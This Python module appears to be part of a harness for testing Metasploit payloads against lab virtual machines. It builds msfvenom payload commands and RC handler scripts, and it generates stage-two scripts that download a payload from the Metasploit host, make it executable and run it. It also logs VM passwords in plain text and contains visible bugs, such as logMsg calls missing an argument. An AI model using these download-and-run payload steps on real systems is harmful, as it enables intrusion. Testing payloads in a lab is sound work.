from datetime import datetime
import os
import time
import json

#
# GOT TIRED OF TRACKING THIS DATA IN A LIST
# 
class portValue:
    """
    THE BELOW portValue CLASS IS HOW I DECIDED TO TRACK THE PORT NUMBERS
    I WANTED A SINGLETON, BUT I FOUND NOTHING IN PYTHON THAT DID THAT.
    THIS CLASS LETS ME SIMPLY CALL get.portValue() AND IT RETURNS A 
    UNIQUE PORT VALUE, SO I DO NOT HAVE TO TRACK WHICH VALUES HAVE BEEN USED.
    """
    def __init__(self, initialValue):
        self.portNumber = initialValue
        
    def get(self):
        self.portNumber = self.portNumber + 1
        return self.portNumber

def loadJson(fileName):
    """
    READ IN THE JSON FILES AND RETURN A DICTIONARY
    GOT TIRED OF WRITING THE TRY/CATCH BLOCKS IN A COUPLE PLACES
    """
    retDict = None
    try:
        fileObj = open(fileName, 'r')
        jsonStr = fileObj.read()
        fileObj.close()
    except IOError as e:
        logMsg("FAILED TO FIND JSON FILE " + fileName + "\n" + str(e))
        return retDict
    try:
        retDict = json.loads(jsonStr)
    except ValueError as f:
        logMsg("FAILED TO PARSE JSON FILE " + fileName + "\n" + str(f))
    return retDict

def makeHtmlReport(targetData, msfHosts):
    htmlString = "<html>\n<head>\n<title>\n\tTEST RESULTS\n</title>\n</head>\n\n<body>\n"
    htmlString = htmlString + "<table border=\"1\">\n<tr><td>MSF_HOST NAME</td><td>MSF_HOST IP</td><td>MSF COMMIT VERSION</td><td>PCAP</td></tr>\n"
    for msfHost in msfHosts:
        pcapLink = "<a href=" + msfHost['LOCAL_PCAP'] + ">PCAP FILE</a>"
        htmlString = htmlString + "<tr><td>" + msfHost['NAME'] + "</td><td>" + msfHost['IP_ADDRESS'] + "</td><td>" + msfHost['COMMIT_VERSION'] + "</td><td>" + pcapLink + "</td></tr>\n"
    htmlString = htmlString + "</table>\n"
    htmlString = htmlString + "<table border=\"1\">\n<tr><td>TARGET</td><td>TYPE</td><td>MSF_HOST</td><td>MODULE</td><td>PAYLOAD</td><td>STATUS</td><td>SESSION</td></tr>\n"
    passedString = "<td bgcolor = \"#00cc00\">PASSED</td>"
    failedString = "<td bgcolor = \"#cc0000\">FAILED</td>"
    for host in targetData:
        stageTwoFileName = "NONE?"
        if 'STAGE_TWO_FILENAME' in host:
            stageTwoFileName = host['STAGE_TWO_FILENAME']
        for sessionData in host['SESSION_DATASETS']:
            payloadFileName = "NO PAYLOAD FILE"
            payloadName = "NO PAYLOAD (AUX?)"
            interpreter = ""            
            if 'PAYLOAD' in sessionData:
                payloadName = sessionData['PAYLOAD']['NAME'].lower()
                if 'FILENAME' in sessionData['PAYLOAD']:
                    payloadFileName = sessionData['PAYLOAD']['FILENAME']
                if 'java' in payloadName:
                    interpreter = "<br>" + host['METERPRETER_JAVA']
                if 'python' in payloadName:
                    interpreter = "<br>" + host['METERPRETER_PYTHON']
            htmlString = htmlString + "<tr><td>" + host['NAME'] + "<br>" + host['IP_ADDRESS'] + "</td>" + \
                                    "<td>" + host['TYPE'] + "</td>" + \
                                    "<td>" + sessionData['MSF_HOST']['NAME'] + "<br>" + sessionData['MSF_HOST']['IP_ADDRESS'] + "</td>" + \
                                    "<td>" + sessionData['MODULE']['NAME'] + "</td>" + \
                                    "<td>" + payloadName + "<br>" + payloadFileName + interpreter + "</td>"
            if 'STATUS' in sessionData:
                if sessionData['STATUS']:
                    htmlString = htmlString + "<td bgcolor = \"#00cc00\">PASSED</td>\n"
                else:
                    htmlString = htmlString + "<td bgcolor = \"#cc0000\">FAILED</td>\n"
            else:
                htmlString = htmlString + "<td> NO STATUS LISTED?</td>\n"
            htmlString = htmlString + "<td><a href=" + sessionData['LOCAL_SESSION_FILE'] + ">SESSION CONTENT</a></td></tr>\n"

    htmlString = htmlString + "</table>\n</body>\n</html>\n"
    return htmlString

def makeVenomCmd(targetData, sessionData, portTracker, logFile):
    payloadData = sessionData['PAYLOAD']
    payloadType = payloadData['NAME']
    payloadFileName = payloadData['FILENAME']
    msfHostData = sessionData['MSF_HOST']
    """
    WHAT FILE EXTENSION SHOULD WE USE?
    """
    execFormat = ''
    if 'windows' in payloadData['NAME'].lower():
        payloadFileName = payloadFileName + ".exe"
        execFormat = ' -f exe '
    elif 'linux' in payloadData['NAME'].lower():
        payloadFileName = payloadFileName + ".elf"
        execFormat = ' -f elf '
    elif 'python' in payloadData['NAME'].lower():
        payloadFileName = payloadFileName + ".py"
    elif 'java' in payloadData['NAME'].lower():
        payloadFileName = payloadFileName + ".jar"
    else:
        logMsg(logFile, "UNKNOWN PAYLOAD TYPE: " + payloadData['NAME'].lower())
    payloadData['FILENAME'] = payloadFileName
    logMsg(logFile, "PAYLOAD FILENAME = " + payloadData['FILENAME'])
    msfVenomCmd = "./msfvenom -p " + payloadData['NAME'] + execFormat + " -o " + payloadData['FILENAME']
    # ADD HOST DATA
    if 'bind' in payloadType.lower():
        msfVenomCmd = msfVenomCmd + " RHOST=" + targetData['IP_ADDRESS'] + " LPORT=" + str(payloadData['PRIMARY_PORT'])
    else:
        msfVenomCmd = msfVenomCmd + " LHOST=" + msfHostData['IP_ADDRESS'] + " LPORT=" + str(payloadData['PRIMARY_PORT'])
    for settingEntry in payloadData['SETTINGS']:
        msfVenomCmd = msfVenomCmd + " " + settingEntry
    logMsg(logFile, "msfvenom cmd = " + msfVenomCmd)
    return msfVenomCmd

def replaceWildcards(originalString, targetData, sessionData, portNum):
    if 'UNIQUE_PORT' in originalString:
        originalString = originalString.replace("UNIQUE_PORT", str(portNum.get()), 1)
    if 'MSF_IP' in originalString:
        originalString = originalString.replace("MSF_IP", sessionData['MSF_HOST']['IP_ADDRESS'], 1)
    if 'TARGET_IP' in originalString:
        originalString = originalString.replace("TARGET_IP", targetData['IP_ADDRESS'], 1)
    if 'TARGET_USERNAME' in originalString:
        originalString = originalString.replace("TARGET_USERNAME", targetData['USERNAME'], 1)
    if 'TARGET_PASSWORD' in originalString:
        originalString = originalString.replace("TARGET_PASSWORD", targetData['PASSWORD'], 1)
    return originalString

def makeRcScript(cmdList, targetData, sessionData, logFile, portNum):
    if 'PAYLOAD' in sessionData:
        payloadName = sessionData['PAYLOAD']['NAME']
    else:
        payloadName = "NONE"
    rcScriptContent =   "# HANDLER SCRIPT FOR \n" + \
                    "# MODULE:  " + sessionData['MODULE']['NAME'] + "\n" + \
                    "# PAYLOAD:  " + payloadName + "\n" + \
                    "# TARGET:   " + targetData['NAME'] + ' [' + targetData['IP_ADDRESS'] +"]\n" + \
                    "# MSF HOST: " + sessionData['MSF_HOST']['IP_ADDRESS'] + "\n"
    rcScriptName = sessionData['RC_IN_SCRIPT_NAME']
    rubySleep = "echo '<ruby>' >> " + rcScriptName + '\n'
    rubySleep = rubySleep + "echo '    sleep(2)' >> " + rcScriptName + '\n'
    rubySleep = rubySleep + "echo '</ruby>' >> " + rcScriptName + '\n'
    rcScriptContent = rcScriptContent + "echo 'use " + sessionData['MODULE']['NAME'] + " ' > " + rcScriptName + "\n"
    if sessionData['MODULE']['NAME'] != 'exploit/multi/handler':
        #THIS IS TERRIBLE, AND I WISH WE DID NOT HAVE TO DO THIS
        rcScriptContent = rcScriptContent + "echo 'set RHOST " + targetData['IP_ADDRESS'] + " ' >> " + rcScriptName + "\n"
        rcScriptContent = rcScriptContent + "echo 'set RHOSTS " + targetData['IP_ADDRESS'] + " ' >> " + rcScriptName + "\n"
    for settingItem in sessionData['MODULE']['SETTINGS']:
        processedString = replaceWildcards(settingItem, targetData, sessionData, portNum)
        if '=' in processedString:
            rcScriptContent = rcScriptContent + "echo 'set " + processedString.split('=')[0] + ' ' + processedString.split('=')[1] + "' >> " + rcScriptName + '\n'
    if 'PAYLOAD' in sessionData:
        rcScriptContent = rcScriptContent + "echo 'set payload " + sessionData['PAYLOAD']['NAME'] +"' >> " + rcScriptName + '\n'
        for settingItem in sessionData['PAYLOAD']['SETTINGS']:
            rcScriptContent = rcScriptContent + "echo 'set " + settingItem.split('=')[0] + ' ' + settingItem.split('=')[1] + "' >> " + rcScriptName + '\n'
        if 'bind' in sessionData['PAYLOAD']['NAME']:
            rcScriptContent = rcScriptContent + "echo 'set RHOST " + targetData['IP_ADDRESS'] + "' >> " + rcScriptName + '\n'
            rcScriptContent = rcScriptContent + "echo 'set LPORT " + str(sessionData['PAYLOAD']['PRIMARY_PORT']) + "' >> " + rcScriptName + '\n'
        if 'reverse' in sessionData['PAYLOAD']['NAME']:
            rcScriptContent = rcScriptContent + "echo 'set LHOST " + sessionData['MSF_HOST']['IP_ADDRESS'] + "' >> " + rcScriptName + '\n'
            rcScriptContent = rcScriptContent + "echo 'set LPORT " + str(sessionData['PAYLOAD']['PRIMARY_PORT']) + "' >> " + rcScriptName + '\n'
        rcScriptContent = rcScriptContent + "echo 'show options' >> " + rcScriptName + '\n'
        rcScriptContent = rcScriptContent + rubySleep
        rcScriptContent = rcScriptContent + "echo 'run -z' >> " + rcScriptName + '\n'
        rcScriptContent = rcScriptContent + "echo '<ruby>' >> " + rcScriptName + '\n'
        rcScriptContent = rcScriptContent + "echo '    while framework.sessions.count == 0 do '>> " + rcScriptName + '\n'
        rcScriptContent = rcScriptContent + "echo '        sleep(1)' >> " + rcScriptName + '\n'
        rcScriptContent = rcScriptContent + "echo '    end' >> " + rcScriptName + '\n'
        rcScriptContent = rcScriptContent + "echo '    sleep(30)' >> " + rcScriptName + '\n'
        rcScriptContent = rcScriptContent + "echo '</ruby>' >> " + rcScriptName + '\n'
    else:
        rcScriptContent = rcScriptContent + "echo 'show options' >> " + rcScriptName + '\n'
        rcScriptContent = rcScriptContent + rubySleep
        rcScriptContent = rcScriptContent + "echo 'run -z' >> " + rcScriptName + '\n'
        rcScriptContent = rcScriptContent + "echo '<ruby>' >> " + rcScriptName + '\n'
        rcScriptContent = rcScriptContent + "echo '  sleep(10)' >> " + rcScriptName + '\n'
        rcScriptContent = rcScriptContent + "echo '</ruby>' >> " + rcScriptName + '\n'
        
    addSleep = True
    for cmd in cmdList:
        processedCmd = replaceWildcards(cmd, targetData, sessionData, portNum)
        rcScriptContent = rcScriptContent + "echo '" + processedCmd + "' >> " + rcScriptName + '\n'
        if "<ruby>" in processedCmd.lower():
            addSleep = False
        if "</ruby>" in processedCmd.lower():
            addSleep = True
        if addSleep:
            rcScriptContent = rcScriptContent + rubySleep
    rcScriptContent = rcScriptContent + "echo 'exit -y' >> " + rcScriptName + '\n'
    return rcScriptContent    

def makeStageTwoShScript(targetData, httpPort, remoteLogFile, terminationToken):
    stageTwoShContent = "# AUTOGENERATED TEST SCRIPT \n"
    stageTwoShContent = stageTwoShContent + "cd " + targetData['PAYLOAD_DIRECTORY'] + " \n"
    for sessionData in targetData['SESSION_DATASETS']:
        if 'PAYLOAD' in sessionData and sessionData['MODULE']['NAME'].lower() == "exploit/multi/handler":
            msfIpAddress = sessionData['MSF_HOST']['IP_ADDRESS']
            payloadFile = sessionData['PAYLOAD']['FILENAME']
            url = "'http://" + msfIpAddress + ":" + str(httpPort) + "/" + payloadFile + "'\n"
            stageTwoShContent = stageTwoShContent + "\nwget " + url + "\n"
            stageTwoShContent = stageTwoShContent + "sleep 5 \n"
            stageTwoShContent = stageTwoShContent + "chmod 755 " + payloadFile + "\n"
            if '.py' in payloadFile:
                stageTwoShContent = stageTwoShContent + targetData['METERPRETER_PYTHON'] + " " + payloadFile + "&\n"
            elif 'jar' in payloadFile:
                stageTwoShContent = stageTwoShContent + targetData['METERPRETER_JAVA'] + " -jar " + payloadFile + "&\n"
            else:
                stageTwoShContent = stageTwoShContent + "./" + payloadFile + "&\n"
    return stageTwoShContent

def makeStageTwoPyScript(targetData, httpPort, remoteLogFile, terminationToken):
    stageTwoPyContent = "# AUTOGENERATED TEST SCRIPT \n"
    stageTwoPyContent = stageTwoPyContent + "import subprocess\n"
    stageTwoPyContent = stageTwoPyContent + "import time\n"
    stageTwoPyContent = stageTwoPyContent + "import urllib\n"
    stageTwoPyContent = stageTwoPyContent + "\n"
    stageTwoPyContent = stageTwoPyContent + "def logError(logFile, logMessage):\n"
    stageTwoPyContent = stageTwoPyContent + "  try:\n"
    stageTwoPyContent = stageTwoPyContent + "    fileObj = open(logFile, 'a')\n"
    stageTwoPyContent = stageTwoPyContent + "    fileObj.write(logMessage)\n"
    stageTwoPyContent = stageTwoPyContent + "    fileObj.close()\n"
    stageTwoPyContent = stageTwoPyContent + "  except Exception as e:\n"
    stageTwoPyContent = stageTwoPyContent + "    print 'logError Failed: ' + str(e) + '\\n'\n"
    stageTwoPyContent = stageTwoPyContent + "    return False\n"
    stageTwoPyContent = stageTwoPyContent + "  return True\n"
    stageTwoPyContent = stageTwoPyContent + "\n"
    stageTwoPyContent = stageTwoPyContent + "def getPayload(url, localName, logFile):\n"
    stageTwoPyContent = stageTwoPyContent + "  logError(logFile, 'DOWNLOADING ' + url + '\\n')\n"
    stageTwoPyContent = stageTwoPyContent + "  try:\n"
    stageTwoPyContent = stageTwoPyContent + "    urllib.urlretrieve(url, localName)\n"
    stageTwoPyContent = stageTwoPyContent + "  except Exception as e:\n"
    stageTwoPyContent = stageTwoPyContent + "    logError(logFile, 'FAILED TO GET ' + url + ':\\n' + str(e) + '\\n')\n"
    stageTwoPyContent = stageTwoPyContent + "    return False\n"
    stageTwoPyContent = stageTwoPyContent + "  logError(logFile, 'DOWNLOADED ' + url + '\\n')\n"
    stageTwoPyContent = stageTwoPyContent + "  return True\n"
    stageTwoPyContent = stageTwoPyContent + "\n"
    stageTwoPyContent = stageTwoPyContent + "def runCommand(cmdList, getOutput, logFile):\n"
    stageTwoPyContent = stageTwoPyContent + "  logError(logFile, 'LAUNCHING ' + ' '.join(cmdList) + '\\n')\n"
    stageTwoPyContent = stageTwoPyContent + "  try:\n"
    stageTwoPyContent = stageTwoPyContent + "    payloadProcess = subprocess.Popen(cmdList, stdout = subprocess.PIPE, stderr = subprocess.PIPE)\n"
    stageTwoPyContent = stageTwoPyContent + "  except Exception as e:\n"
    stageTwoPyContent = stageTwoPyContent + "    logError(logFile, 'FAILED TO RUN ' + ' '.join(cmdList) + ':\\n' + str(e) +'\\n')\n"
    stageTwoPyContent = stageTwoPyContent + "    return False\n"
    stageTwoPyContent = stageTwoPyContent + "  logError(logFile, 'LAUNCHED ' + ' '.join(cmdList) + '\\n')\n"
    stageTwoPyContent = stageTwoPyContent + "  time.sleep(5)\n"
    stageTwoPyContent = stageTwoPyContent + "  if getOutput:\n"
    stageTwoPyContent = stageTwoPyContent + "    return payloadProcess.communicate()\n"
    stageTwoPyContent = stageTwoPyContent + "  return True\n"
    stageTwoPyContent = stageTwoPyContent + "logError(r'" + remoteLogFile + "', 'TESTING\\n')\n"
    stageTwoPyContent = stageTwoPyContent + "\n"

    for sessionData in targetData['SESSION_DATASETS']:
        if 'PAYLOAD' in sessionData and sessionData['MODULE']['NAME'].lower() == "exploit/multi/handler":
            msfIpAddress = sessionData['MSF_HOST']['IP_ADDRESS']
            payloadFile = sessionData['PAYLOAD']['FILENAME']
            stageTwoPyContent = stageTwoPyContent + "url = 'http://" + msfIpAddress + ":" + str(httpPort) + "/" + payloadFile + "'\n"
            stageTwoPyContent = stageTwoPyContent + "fileName = r'" + targetData['PAYLOAD_DIRECTORY'] + '\\' + payloadFile + "'\n"
            if '.py' in payloadFile:
                stageTwoPyContent = stageTwoPyContent + "cmdList = [r'" + targetData['METERPRETER_PYTHON'] +"', fileName]\n"
            elif 'jar' in payloadFile:
                stageTwoPyContent = stageTwoPyContent + "cmdList = [r'" + targetData['METERPRETER_JAVA'] + "','-jar', fileName]\n"
            else:
                stageTwoPyContent = stageTwoPyContent + "cmdList = [fileName]\n"
        stageTwoPyContent = stageTwoPyContent + "getPayload(url, fileName, r'" + remoteLogFile + "')\n"
        stageTwoPyContent = stageTwoPyContent + "runCommand(cmdList, False, r'" + remoteLogFile + "')\n"
        stageTwoPyContent = stageTwoPyContent + "cmdList = ['netstat',  '-ant']\n"
        stageTwoPyContent = stageTwoPyContent + "netstatResults = runCommand(cmdList, True, r'" + remoteLogFile + "')\n"
    stageTwoPyContent = stageTwoPyContent + "logError(r'" + remoteLogFile + "', str(netstatResults[0]))\n"
    stageTwoPyContent = stageTwoPyContent + "logError(r'" + remoteLogFile + "', str(netstatResults[1]))\n"
    stageTwoPyContent = stageTwoPyContent + "logError(r'" + remoteLogFile + "','" + terminationToken + "\\n')\n"

    return stageTwoPyContent

def getListFromFile(fileName):
    retList = []
    logMsg("GETTING COMMANDS FROM " + str(fileName))
    if fileName != None:
        with open(fileName, 'r') as fileObj:
            for i in fileObj.readlines():
                if '#' != i.strip()[0]:
                    retList.append(i.strip())
    logMsg(str(retList))
    return retList

def logMsg(logFile, strMsg):
    if strMsg == None:
        strMsg="[None]"
    dateStamp = 'testlog:[' + str(datetime.now())+ '] '
    try:
        logFileObj = open(logFile, 'a')
        logFileObj.write(dateStamp + strMsg +'\n')
        logFileObj.close()
    except IOError:
        return False
    return True
    
def selectVms(vmList, posFilter=None):
    menuVms = []
    selectedVmList = []
    for i in vmList:
        if (posFilter == None) or (posFilter.upper() in i.vmIdentifier.upper()):
            menuVms.append(i)
    for i in range(len(menuVms)):
            print(str(i) + " " + menuVms[i].vmIdentifier)
    feedBack = raw_input(">> ")
    print("SELECTION: " + feedBack +'\n')
    feedbackList = feedBack.split(',')
    for i in feedbackList:
        selectedVmList.append(menuVms[int(i)])
    return selectedVmList

def findAndConfigVms(vmList, vmDataList):
    foundVmList = []
    for vmData in vmDataList:
        try:
            vmName =        vmData['VM_NAME']
            vmUsername =    vmData['VM_USERNAME']
            vmPassword =    vmData['VM_PASSWORD']
        except KeyError as e:
            logMsg("[JSON PARSE ERROR]: COULD NOT FIND VALUE " + \
                    str(e))
            continue
        for j in vmList:
            if vmName.lower() in j.vmName.lower():
                foundVmList.append(j)
                logMsg("ADDING USERNAME " + vmUsername + " PASSWORD " + vmPassword + " TO " + vmName + " : " + j.vmName)
                j.setPassword(vmPassword)
                j.setUsername(vmUsername)
    return foundVmList
